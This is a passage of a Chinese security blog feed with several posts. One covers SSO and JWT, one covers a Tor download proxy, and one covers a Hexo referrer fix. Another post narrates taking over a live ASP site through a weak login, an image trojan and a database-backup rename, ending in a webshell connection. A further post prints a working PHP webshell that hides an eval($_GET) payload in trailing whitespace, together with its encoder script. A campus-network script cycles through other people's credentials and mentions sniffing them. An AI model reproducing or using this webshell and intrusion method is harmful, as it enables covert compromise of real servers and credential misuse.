title="单点登录的认证和授权"></a>单点登录的认证和授权</h1>在学习单点登录的过程中，在其中认证的过程中授权令牌的传递等相关信息没有特别详细的说明，而且在思考单点登录的时候也会有想过一个比较矛盾的问题：单点登录的目标是为了让用户可以在相互信任的系统中一次登录即可，但是如果真的是做到所有用户都可以访问所有系统，岂不是会带来越权的问题，是否需要对不同的用户以不同的授权，甚至限制访问的应用，但是这样是不是就不是原本狭义的单点认证？<h2 id="统一身份认证和单点登录"><a href="#统一身份认证和单点登录" class="headerlink" title="统一身份认证和单点登录"></a>统一身份认证和单点登录</h2>在说单点登录的认证和授权之前，先谈一谈我一直想弄清楚的统一身份认证和单点登录的区别。说起单点登录可能很少听过，但是统一身份认证肯定不陌生，不管是企业还是高校都会有这种统一身份认证的系统。<br>统一身份认证最重要的一方面就是身份认证，另一方面就是和身份认证相关的授权控制，权限控制。而单点登录是多应用一次登录，也可以叫统一登录，可以理解为主要在认证方面。对于统一身份认证来说会有账号管理，如LDAP，认证管理OAuth，SMAL等，因此我觉得，统一身份认证一般是包括狭义的单点登录，狭义的单点登录，即只需要满足多应用一次登录即可。但是现在的单点登录，SSO系统并不仅仅是要求这些，他的范围正在慢慢扩大。<h2 id="单点登录的认证和授权-1"><a href="#单点登录的认证和授权-1" class="headerlink" title="单点登录的认证和授权"></a>单点登录的认证和授权</h2>单点登录的认证和授权，前面说到的CAS实现单点登录里就会看到需要ticket来进行认证，授权。CAS支持多种认证方案，比如OAuth，OpenID，SAML等等，我们可以来比较比较用这些协议的区别，或者说是在哪些场景下使用哪些认证方案较为合适。本身单点登录是没有权限控制的功能的，但是因为这些认证协议的需求，自然支持了权限控制。<br>在使用SAML进行认证的过程中，可以看到下图，其是基本流程都差不多，这里需要注意的就是在用户在认证中心成功登陆之后，重定向的时候返回的是一个SAML token，一个XML节点，这里的token会包括用户的身份信息，用户名等。<br><img src="https://upload-images.jianshu.io/upload_images/6269327-b298b7dc5732b796.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="SAML 2.0 Flow"><br>在OAuth2.0的标准中流程是和上面的基本相同，但是OAuth2因为客户端并没有一点是浏览器，所以token中默认是没有签名的。这里可能没有体现出来，OAuth2的目标是授权，所以token更关注的是权限，token在向认证服务器验证的时候就会有不同的授权，但是既然是授权，就间接实现了认证。<br><img src="https://upload-images.jianshu.io/upload_images/6269327-9372aa0aa3c3eb24.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>OAuth的本意是一个应用允许另一个应用在用户授权的情况下访问自己的数据,OAuth 的设计本意更倾向于授权而非认证。就比如说，一个网站上登录的时候可使用google账号登录，然后可以看到我们登录的时候会让我们选择该网站可以访问的我们的google信息，这里就是使用OAuth的授权，进行信息访问。再看看另一个协议OpenID，OpenID也是经常用于第三方登录的，我们上面说到了OpenID实现的单点登录，其中的认证服务器就可以是第三方的，但是使用OpenID协议的第三方登录，只是一个认证功能，前面也强调过OpenID只是认证的协议，因此使用OpenID协议的第三方登录只是让我们免于注册，只是一个身份而已。<br>在OAuth和SAML中都提到了token来传递授权或者认证信息，而在OpenID协议中可能会使用OpenID，而最终一般都是使用session的机制来实现浏览器和应用直接的访问。另一种基于jwt的。<h2 id="使用JWT进行认证"><a href="#使用JWT进行认证" class="headerlink" title="使用JWT进行认证"></a>使用JWT进行认证</h2>在传统的认证中都是基于session机制的，具体的session模式上面也说了，根据其特性可知session的一些确定：</li><li>session保存在服务器，当注册用户很多，会增加服务器的开销。</li><li>用户认证之后，服务端做认证记录，如果认证的记录被保存在内存中的话，这意味着用户下次请求还必须要请求在这台服务器上,这样才能拿到授权的资源，这样在分布式的应用上，限制了负载均衡的能力。这也意味着限制了应用的扩展能力。</li><li>session是基于cookie来进行用户识别的, cookie如果被截获，用户就会很容易受到跨站请求伪造（CSRF）的攻击。<br>具体的JWT认证相关的信息有文章已经总结的很好了，就不重复说了，<a href="https://juejin.im/post/5d0dbb7e6fb9a07f0420512d" target="_blank" rel="noopener">传送门</a>。<br>概括一下JWT认证的优点：</li><li>因为json的通用性，所以JWT是可以进行跨语言支持的，像JAVA,JavaScript,NodeJS,PHP等很多语言都可以使用；</li><li>因为有了payload部分，所以JWT可以在自身存储一些其他业务逻辑所必要的非敏感信息；</li><li>便于传输，jwt的构成非常简单，字节占用很小，所以它是非常便于传输的；</li><li>它不需要在服务端保存会话信息, 所以它易于应用的扩展。<br>但是因为JWT的性质，在其签证信息三部分中前两部分都是base64加密，攻击者是可以轻易获取并破解的，所以在使用JWT时也会有一些安全性的问题：</li><li>不应该在jwt的payload部分存放敏感信息，因为该部分是客户端可解密的部分;</li><li>保护好secret私钥以及私钥的强度，该私钥非常重要;</li><li>如果可以，请使用https协议；</li><li>JWT要有过期时间，JWT过期后Token的置换问题。<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><a href="https://www.mutuallyhuman.com/blog/choosing-an-sso-strategy-saml-vs-oauth2/" target="_blank" rel="noopener">https://www.mutuallyhuman.com/blog/choosing-an-sso-strategy-saml-vs-oauth2/</a><br><a href="https://yq.aliyun.com/articles/636281" target="_blank" rel="noopener">https://yq.aliyun.com/articles/636281</a><br><a href="https://juejin.im/post/5d0dbb7e6fb9a07f0420512d" target="_blank" rel="noopener">https://juejin.im/post/5d0dbb7e6fb9a07f0420512d</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title&gt;&lt;/a&gt;&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;/h2&gt;&lt;h1 id=&quot;谈谈单点登录&quot;&gt;&lt;a href=&quot;#谈谈单点登录&quot; class=&quot;he
      
    
    </summary>
    
      <category term="安全知识" scheme="https://rliyuqing.github.io/categories/%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86/"/>
    
    
      <category term="安全知识" scheme="https://rliyuqing.github.io/tags/%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>数据库备份拿webshell</title>
    <link href="https://rliyuqing.github.io/2019/11/23/12.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%87%E4%BB%BD%E6%8B%BFwebshell/"/>
    <id>https://rliyuqing.github.io/2019/11/23/12. 数据库备份拿webshell/</id>
    <published>2019-11-22T16:31:56.785Z</published>
    <updated>2019-11-22T16:31:56.786Z</updated>
    
    <content type="html"><![CDATA[<h2 id><a href="#" class="headerlink" title></a><meta name="referrer" content="no-referrer"></h2><h1 id="数据库备份拿webshell"><a href="#数据库备份拿webshell" class="headerlink" title="数据库备份拿webshell"></a>数据库备份拿webshell</h1><hr><h2 id="测试之前"><a href="#测试之前" class="headerlink" title="测试之前"></a>测试之前</h2><p>数据库备份拿webshell算是比较老的web后台才有的一个漏洞，之前也做过类似的，这次偶然有机会帮朋友看来一个类似的站，所以在此分享一下。仅供学习，严守底线。</p><h2 id="测试开始"><a href="#测试开始" class="headerlink" title="测试开始"></a>测试开始</h2> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://xxxxxxx.com/Manage/login.asp</span><br></pre></td></tr></table></figure><p>登陆界面：<br><img src="https://upload-images.jianshu.io/upload_images/6269327-98608b271e4f9742.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="登陆"><br>帐号密码是若密码。然后进后台简单的看了看，发现是kindeditor的编辑器，13年的应该是4.1.10，所以之前爆出的漏洞基本不能使用：<br><img src="https://upload-images.jianshu.io/upload_images/6269327-bd787d76eee16c96.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="编辑器"><br>因为是很老的框架了，然后也会有网站根目录以及一些敏感信息：<br><img src="https://upload-images.jianshu.io/upload_images/6269327-691b32121515ace1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="敏感信息"><br>然后发现有数据库备份，这网站基本凉了：<br><img src="https://upload-images.jianshu.io/upload_images/6269327-a906e1521b4b419e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="数据库备份"><br>通过前面的信息我们可以看到这是asp+iis的站点，但是数据库备份的地点原始数据库不能更改但是备份数据库的可以更改，这比较简单，突破一下，抓包改一改就行。<br>然后现在我们先要上传一个图片的木马为数据库备份做准备，为啥呢？<br>简单说一下数据库备份拿shell的原理，数据库备份是为网站管理者提供备份数据的功能，网站管理者可以将指定位置的文件进行备份，但是为了安全，网站后台都是不允许我们自己指定位置的，比如我们现在这个，但是这个一看就是在前台加的限制，后台没有校验，所以我们可以向上传一个写入小马的图片文件，然后得到他的路径，在将这个路径进行数据库备份，备份是指定w为asp后缀就行。<br>上传图片：<br><img src="https://upload-images.jianshu.io/upload_images/6269327-e8cea9224c51c9c4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="上传图片"><br> firefox看一下返回的路径就可以了，然后备份数据库抓包更改路径：<br><img src="https://upload-images.jianshu.io/upload_images/6269327-04772f0df74e8bb6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="更改之前"><br>然后改一下需要备份的路径就行了，猜测一下路径：<br><img src="https://upload-images.jianshu.io/upload_images/6269327-ff34196fa72fa415.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="更改之后"><br>然后重发就可以了：<br><img src="https://upload-images.jianshu.io/upload_images/6269327-6d296d3b099669a3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="重发"><br>看到这个返回就知道成功了，可以看到这个是有waf的，有狗的话可以注意过狗，狗的话虽然看着很凶，博主最近和狗打了太多的交道了，也就那几招，过多了就发现就是傻狗。一句话变相一下就行。<br>不过我们发现这里并没有爆出备份后的路径，这个大概猜一下就行实在猜不出来可以自己看一下这个框架了，毕竟马都传上去了。大概看了看，返回有FolderBackUp.asp然后请求的是/Manage/DataBackUp.asp这个路径，然后后台也说了备份文件夹是databackup，大概测了测就猜到了:<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://xxxxxx.com/Manage/databackup/mssqldb.asp</span><br></pre></td></tr></table></figure></p><p>然后菜刀连接一下就行了：<br><img src="https://upload-images.jianshu.io/upload_images/6269327-f476bbd27d950c8c.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="shell"><br>好了，就到此为止了，后面的就不往后深入了，清理痕迹。</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>仅供学习，勿做他用。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title&gt;&lt;/a&gt;&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;/h2&gt;&lt;h1 id=&quot;数据库备份拿webshell&quot;&gt;&lt;a href=&quot;#数据库备份拿web
      
    
    </summary>
    
      <category term="实战演练" scheme="https://rliyuqing.github.io/categories/%E5%AE%9E%E6%88%98%E6%BC%94%E7%BB%83/"/>
    
    
      <category term="数据库备份getshell" scheme="https://rliyuqing.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%87%E4%BB%BDgetshell/"/>
    
  </entry>
  
  <entry>
    <title>服务器socket代理访问darknet</title>
    <link href="https://rliyuqing.github.io/2019/11/22/31.%E6%9C%8D%E5%8A%A1%E5%99%A8socket%E4%BB%A3%E7%90%86%E8%AE%BF%E9%97%AEdarknet/"/>
    <id>https://rliyuqing.github.io/2019/11/22/31.服务器socket代理访问darknet/</id>
    <published>2019-11-22T04:00:00.000Z</published>
    <updated>2019-11-22T16:31:56.809Z</updated>
    
    <content type="html"><![CDATA[<h2 id><a href="#" class="headerlink" title></a><meta name="referrer" content="no-referrer"></h2><h1 id="服务器socket代理访问darknet"><a href="#服务器socket代理访问darknet" class="headerlink" title="服务器socket代理访问darknet"></a>服务器socket代理访问darknet</h1><hr><p>[转] <a href="https://www.zhangminghao.com/post/48.html" target="_blank" rel="noopener">原文</a><br>chrome挂tor代理从darknet上下载东西是十分的慢，而且动不动就会断，速度还慢，十分难受。决定在服务器上使用wget挂代理下载，但是wget是不支持socket5的代理的，所以不能直接使用wget指定代理参数进行代理下载darkweb的文件，最后想着直接使用Proxychains工具进行终端代理。</p><h2 id="工具下载与安装"><a href="#工具下载与安装" class="headerlink" title="工具下载与安装"></a>工具下载与安装</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/rofl0r/proxychains-ng.git</span><br><span class="line"><span class="built_in">cd</span> proxychains-ng</span><br><span class="line">./configure --prefix=/usr --sysconfdir=/etc</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br><span class="line">sudo make install-config</span><br></pre></td></tr></table></figure><h2 id="配置Proxychains"><a href="#配置Proxychains" class="headerlink" title="配置Proxychains"></a>配置Proxychains</h2><p>修改/etc/proxychains.conf文件<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[ProxyList]</span><br><span class="line"><span class="comment"># 将代理服务器添加到此处</span></span><br><span class="line"><span class="comment"># 格式:</span></span><br><span class="line"><span class="comment">#  socks5   192.168.67.78   1080  lamer   secret</span></span><br><span class="line"><span class="comment">#  http       192.168.89.3     8080  justu    hidden</span></span><br><span class="line"><span class="comment">#  socks4   192.168.1.49     1080</span></span><br><span class="line"><span class="comment">#  http       192.168.39.93   8080</span></span><br><span class="line"><span class="comment">#  支持的代理种类: http, socks4, socks5</span></span><br><span class="line"><span class="comment">#  支持的验证模式: "basic"-http  "user/pass"-socks</span></span><br><span class="line">socks5 127.0.0.1 1080</span><br></pre></td></tr></table></figure></p><p><img src="https://upload-images.jianshu.io/upload_images/6269327-57d0b82c58dd93c0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h2 id="使用Proxychains"><a href="#使用Proxychains" class="headerlink" title="使用Proxychains"></a>使用Proxychains</h2><p>当前Proxychains的版本是4.11，所以编译的二进制程序名是proxychains4，按以下格式使用<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">proxychains4  wget xxxxxxx.onion/1.txt</span><br></pre></td></tr></table></figure></p><p>再配合screen挂后台就行啦，这样就不怕下大文件动不动就断了。<br><img src="https://upload-images.jianshu.io/upload_images/6269327-53ade32da0d164f0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title&gt;&lt;/a&gt;&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;/h2&gt;&lt;h1 id=&quot;服务器socket代理访问darknet&quot;&gt;&lt;a href=&quot;#服务器
      
    
    </summary>
    
      <category term="其他" scheme="https://rliyuqing.github.io/categories/%E5%85%B6%E4%BB%96/"/>
    
    
      <category term="其他" scheme="https://rliyuqing.github.io/tags/%E5%85%B6%E4%BB%96/"/>
    
  </entry>
  
  <entry>
    <title>简书文章图片外链403问题</title>
    <link href="https://rliyuqing.github.io/2019/11/14/30.%E7%AE%80%E4%B9%A6%E6%96%87%E7%AB%A0%E5%9B%BE%E7%89%87%E5%A4%96%E9%93%BE403%E9%97%AE%E9%A2%98/"/>
    <id>https://rliyuqing.github.io/2019/11/14/30.简书文章图片外链403问题/</id>
    <published>2019-11-14T04:00:00.000Z</published>
    <updated>2019-11-22T16:31:56.808Z</updated>
    
    <content type="html"><![CDATA[<h2 id><a href="#" class="headerlink" title></a><meta name="referrer" content="no-referrer"></h2><h1 id="简书文章图片外链403问题"><a href="#简书文章图片外链403问题" class="headerlink" title="简书文章图片外链403问题"></a>简书文章图片外链403问题</h1><hr><p>最近刚上研，所以事情比较多，一直没有注意到自己<a href="http://www.raosong.cc" target="_blank" rel="noopener">博客</a>的图片都无法访问了，都是403，后面了解才发现是简书对图片外链设置了限制，简单来说就是做了个根据http请求头中的referrer的值来验证请求是不是来自本站，如果不是就返回403或者重定向之类的。<br>可以看到简书这么做很明显是因为大部分人都把简书当做图床或者云笔记的平台来使用，高额的服务器费用，却没有代理经济价值，没有办法，只能通过这种方法来限制“白嫖用户”。<br>说说具体情况吧，我的博客是github上使用hexo搭建的，然后在简书写，写完同步到个人博客上的，简书的这个措施直接影响到我个人博客的使用了，那就只能改改呗。经过测试简书和微博的图片外链在referrer值为空也是可以访问的，所以他们的策略是只要你带了其他站点的信息就403，所以我们只要设置页面的referrer值为空就行。看了看网上的说法<br><img src="https://upload-images.jianshu.io/upload_images/6269327-37ca5e73fc4ae388.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>直接在文章里面添加<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;meta name=<span class="string">"referrer"</span> content=<span class="string">"no-referrer"</span>/&gt;</span><br></pre></td></tr></table></figure></p><p>确实是个方法，但是我的文章太多了，一个一个加太麻烦了，而且我主页上还有图片呢，既然是hexo，直接生成静态页面的，那就直接改配置文件就行。<br>在themes/主题/layout路径里面找到生成页面的ejs文件，然后会有个head之类的ejs文件，在这里面加上上面的代码就行：<br><img src="https://upload-images.jianshu.io/upload_images/6269327-b3fa80672d620df9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>可能会在下面的子目录里面，或者其他的配置文件，具体看代码怎么写的。改好之后hexo d -g就行啦。最近写的比较少了，后面会慢慢继续开始记录一下东西了。<br>不知道后面简书或者其他的平台对于图片外链会有其他的限制手段，只能见招拆招了，不过应该就是在取舍上做的一个平衡了，要是真的把图片外链限制的死死的那就真的会损是很多用户的吧，所以我对这事还是挺放心的，毕竟我也不是白嫖党。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title&gt;&lt;/a&gt;&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;/h2&gt;&lt;h1 id=&quot;简书文章图片外链403问题&quot;&gt;&lt;a href=&quot;#简书文章图片外链40
      
    
    </summary>
    
      <category term="其他" scheme="https://rliyuqing.github.io/categories/%E5%85%B6%E4%BB%96/"/>
    
    
      <category term="其他" scheme="https://rliyuqing.github.io/tags/%E5%85%B6%E4%BB%96/"/>
    
  </entry>
  
  <entry>
    <title>python3 windows校园网自动拨号</title>
    <link href="https://rliyuqing.github.io/2019/11/13/29.python3%20windows%E6%A0%A1%E5%9B%AD%E7%BD%91%E8%87%AA%E5%8A%A8%E6%8B%A8%E5%8F%B7/"/>
    <id>https://rliyuqing.github.io/2019/11/13/29.python3 windows校园网自动拨号/</id>
    <published>2019-11-13T04:00:00.000Z</published>
    <updated>2019-11-22T16:31:56.806Z</updated>
    
    <content type="html"><![CDATA[<h2 id><a href="#" class="headerlink" title></a><meta name="referrer" content="no-referrer"></h2><h1 id="python3-windows校园网自动拨号"><a href="#python3-windows校园网自动拨号" class="headerlink" title="python3 windows校园网自动拨号"></a>python3 windows校园网自动拨号</h1><hr><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>在学校基本没什么时间呆在宿舍，都在实验室。宿舍的台式基本都是用来打游戏的，特地去办个校园网觉得太亏了，但是免费的10G流量也根本不够用，更新个游戏一下就没了。突然发现本科毕业生的校园网每个人都有10G的毕业生流量，于是想着把这些账号拿来用，薅学校的羊毛。就把班上同学的账号要过来（也可以配合嗅探器来用），使用python3来自动拨号上网。</p><h2 id="小脚本"><a href="#小脚本" class="headerlink" title="小脚本"></a>小脚本</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import os</span><br><span class="line">import time</span><br><span class="line">def connect(username,password):</span><br><span class="line">    name=<span class="string">"宽带连接"</span></span><br><span class="line">    cmd_str=<span class="string">"rasdial %s %s %s"</span> %(name,username,password)</span><br><span class="line">    res=os.system(cmd_str)</span><br><span class="line">    <span class="keyword">if</span> res==0:</span><br><span class="line">        <span class="built_in">return</span> True</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(res)</span><br><span class="line">    time.sleep(5)</span><br><span class="line">def disconnect():</span><br><span class="line">    name=<span class="string">"宽带连接"</span></span><br><span class="line">    cmdstr=<span class="string">"rasdial %s /disconnect"</span> %name</span><br><span class="line">    os.system(cmdstr)</span><br><span class="line">    time.sleep(5)</span><br><span class="line"><span class="keyword">if</span> __name__== <span class="string">"__main__"</span>:</span><br><span class="line">    f=open(<span class="string">"info.txt"</span>,<span class="string">"r"</span>)</span><br><span class="line">    i=0</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        i=i+1</span><br><span class="line">        line=line.strip(<span class="string">'\n'</span>)</span><br><span class="line">        <span class="built_in">print</span>(line[0:11],line[12:20])</span><br><span class="line">        <span class="keyword">if</span>(connect(line[0:11],line[12:20]) == True):</span><br><span class="line">            <span class="built_in">break</span></span><br><span class="line">        <span class="comment"># disconnect()</span></span><br><span class="line">    f.close()</span><br></pre></td></tr></table></figure><p>代码很简单就是一个，其实就是一个windows 内置的拨号连接命令rasdial的使用而已。在windows的cmd中可以查看具体参数以及功能。这个脚本从info.txt这个文件中读取校园网账号密码，然后拨号，遇到账号密码错误的情况，5s后就会自动重拨，直到拨上为止。这个info.txt其是配合嗅探器，在学校图书馆嗅探来获取确实很刺激，但是就太嫑脸了，同学的一些账号就够用了。（额，后面的处理格式的方式看起来有点傻:）<br>还有一些小bug，我们的校园网超过10G之后也是可以拨上的，但是会进行限速，很慢很慢，所以准备在脚本中加入测网速的模块，有现成的，还没加上，有空就加上。</p><h2 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h2><p>脚本写好了，接着利用windows的计划任务功能来设置脚本自启动。<br>新建一个计划任务，然后取名：<br><img src="https://upload-images.jianshu.io/upload_images/6269327-03d1caaaf048575f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1"><br>接着选择触发器，就是脚本执行的触发条件，我们设置为用户登录时，只要有用户登录就进行自动拨号。<br><img src="https://upload-images.jianshu.io/upload_images/6269327-950abd4fe766acd6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2"><br>最后执行选择启动程序，其中第一项程序或脚本就是我们执行脚本的编译器的路径，这里我用的是anaconda的python。第二项参数就是我们所执行的文件了，比如我们所执行的文件在C盘根目录，填的就是C:/test.py。最后一项比较关键，起始于，这个网上说法不同，根据试验，应该是脚本执行的位置，就是比如我们这里的自动拨号的脚本connect.py，如果没有填写起始于选项执行时就会出现找不到info.txt文件，所以我们要将起始于这个选项填到脚本所在路径。然后就可以啦，可以注销看看自动拨号。<br><img src="https://upload-images.jianshu.io/upload_images/6269327-b734a256d428c671.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3"><br>还有补充会继续完善。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title&gt;&lt;/a&gt;&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;/h2&gt;&lt;h1 id=&quot;python3-windows校园网自动拨号&quot;&gt;&lt;a href=&quot;#p
      
    
    </summary>
    
      <category term="小脚本" scheme="https://rliyuqing.github.io/categories/%E5%B0%8F%E8%84%9A%E6%9C%AC/"/>
    
    
      <category term="小脚本" scheme="https://rliyuqing.github.io/tags/%E5%B0%8F%E8%84%9A%E6%9C%AC/"/>
    
  </entry>
  
  <entry>
    <title>一个过人的小马</title>
    <link href="https://rliyuqing.github.io/2019/09/20/28.%E4%B8%80%E4%B8%AA%E8%BF%87%E4%BA%BA%E7%9A%84%E5%B0%8F%E9%A9%AC/"/>
    <id>https://rliyuqing.github.io/2019/09/20/28.一个过人的小马/</id>
    <published>2019-09-20T04:00:00.000Z</published>
    <updated>2019-11-22T16:31:56.805Z</updated>
    
    <content type="html"><![CDATA[<h2 id><a href="#" class="headerlink" title></a><meta name="referrer" content="no-referrer"></h2><h1 id="一个过人的小马"><a href="#一个过人的小马" class="headerlink" title="一个过人的小马"></a>一个过人的小马</h1><hr><p>转自：<br><a href="https://imbawenzi.github.io/2019/04/18/一个有趣的webshell---将代码隐藏在空白处/" target="_blank" rel="noopener">https://imbawenzi.github.io/2019/04/18/一个有趣的webshell---将代码隐藏在空白处/</a><br>分享一个小马，不但过狗还过人。<br>小马代码部分：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class newDataProvider &#123;</span><br><span class="line">        <span class="keyword">function</span> <span class="function"><span class="title">__construct</span></span>() &#123;</span><br><span class="line">            <span class="variable">$f</span> = file(__FILE__);</span><br><span class="line">            <span class="variable">$r</span> = <span class="string">""</span>;</span><br><span class="line">            <span class="variable">$c</span> = <span class="string">""</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="variable">$i</span> = 0; <span class="variable">$i</span> &lt; count(<span class="variable">$f</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$i</span> &lt; 15)&#123;</span><br><span class="line">                    <span class="variable">$r</span> .= <span class="variable">$this</span>-&gt;dataProcessor(<span class="variable">$f</span>[<span class="variable">$i</span>]);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable">$c</span> .= <span class="variable">$this</span>-&gt;dataProcessor(<span class="variable">$f</span>[<span class="variable">$i</span>]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$t</span> = <span class="variable">$r</span>(<span class="string">''</span>,<span class="string">"<span class="variable">$c</span>"</span>);</span><br><span class="line">            <span class="variable">$t</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">function</span> dataProcessor(<span class="variable">$li</span>) &#123;</span><br><span class="line">            preg_match(<span class="string">'/([\t ]+)\r?\n?$/'</span>, <span class="variable">$li</span>, <span class="variable">$m</span>);</span><br><span class="line">            <span class="keyword">if</span> (isset(<span class="variable">$m</span>[1])) &#123;</span><br><span class="line">                <span class="variable">$l</span> = dechex(substr_count(<span class="variable">$m</span>[1], <span class="string">"\t"</span>));</span><br><span class="line">                <span class="variable">$r</span> = dechex(substr_count(<span class="variable">$m</span>[1], <span class="string">" "</span>));</span><br><span class="line">                <span class="variable">$n</span> = hexdec(<span class="variable">$l</span>.<span class="variable">$r</span>);</span><br><span class="line">                <span class="built_in">return</span> chr(<span class="variable">$n</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">return</span> <span class="string">""</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    new newDataProvider();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>可以重点关注dataProcessor这个函数，通过正则匹配文件每一行最后的/t或者空格数，并以这两个的计数的十六进制分别代表一位，来拼成一个ascii码。显然这些空格和/t的数量是我们可以自己写好的，这样我们就可以构造空格和/t的数量来构造一个小马或者其他恶意代码。转载的博主已经实现了，可以看看：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">funcName = <span class="string">'create_function'</span></span><br><span class="line">code = <span class="string">'eval($_GET["code"]);'</span></span><br><span class="line">blank = funcName+code</span><br><span class="line"></span><br><span class="line">fin = open(<span class="string">'test.php'</span>,<span class="string">'r'</span>)</span><br><span class="line">fout = open(<span class="string">'testOutput.php'</span>,<span class="string">'w'</span>)</span><br><span class="line">content = fin.readlines()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(content) &lt; len(blank):</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(blank)-len(content)):</span><br><span class="line">content += [<span class="string">'\n'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(blank)):</span><br><span class="line">tensPlace = int(hex(ord(blank[i]))[2], 16)</span><br><span class="line">onesPlace = int(hex(ord(blank[i]))[3], 16)</span><br><span class="line"><span class="keyword">if</span> content[i][-1] == <span class="string">'\n'</span>:</span><br><span class="line">content[i] = content[i][0:-1] + tensPlace*<span class="string">'\t'</span> + onesPlace*<span class="string">' '</span> + <span class="string">'\n'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">content[i] = content[i] + tensPlace*<span class="string">'\t'</span> + onesPlace*<span class="string">' '</span> + <span class="string">'\n'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> content:</span><br><span class="line">fout.write(line)</span><br><span class="line"></span><br><span class="line">fin.close()</span><br><span class="line">fout.close()</span><br></pre></td></tr></table></figure></p><p>利用python脚本来实现从指定代码到空格和/t的添加。这样就在之前的那个文件里面构造了合适的空格和/t来表示恶意代码。生成新的文件便是我们最终的恶意文件了。<br><img src="https://upload-images.jianshu.io/upload_images/6269327-d1684b820a0ee255.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="111"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title&gt;&lt;/a&gt;&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;/h2&gt;&lt;h1 id=&quot;一个过人的小马&quot;&gt;&lt;a href=&quot;#一个过人的小马&quot; class=&quot;
      
    
    </summary>
    
      <category term="webshell" scheme="https://rliyuqing.github.io/categories/webshell/"/>
    
    
      <category term="webshell" scheme="https://rliyuqing.github.io/tags/webshell/"/>
    
  </entry>
  
  <entry>
    <title>企业微信告警和回调</title>
